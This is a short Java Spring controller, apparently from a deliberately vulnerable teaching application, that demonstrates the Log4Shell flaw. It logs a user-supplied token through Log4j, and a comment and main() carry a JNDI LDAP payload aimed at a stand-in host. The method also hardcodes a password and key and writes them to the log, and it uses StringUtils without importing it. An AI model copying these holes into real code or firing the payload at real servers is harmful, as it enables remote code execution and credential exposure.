package org.joychou.controller;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

@RestController
public class Log4j {

    private static final Logger logger = LogManager.getLogger("Log4j");

    /**
     * http://localhost:8080/log4j?token=${jndi:ldap://127.0.0.1:1389/0iun75}
     * Default: error/fatal/off
     * Fix: Update log4j to lastet version.
     */
    @RequestMapping(value = "/log4j")
    public String log4j(String token) {
        logger.info("token: {}", token);
        String password = "Pass@0rd";
        logger.info("User password is "+password);
        String privateKey = "parivate";
        logger.info("paramaters is {}", new Object[]{privateKey});
        if (StringUtils.isBlank(privateKey)) {
            logger.info("something wrong, token: {}, privateKey: {}", token, privateKey);
        }
        return token;
    }

    public static void main(String[] args) {
        String poc = "${jndi:ldap://127.0.0.1:1389/0iun75}";
        logger.info(poc);
    }

}
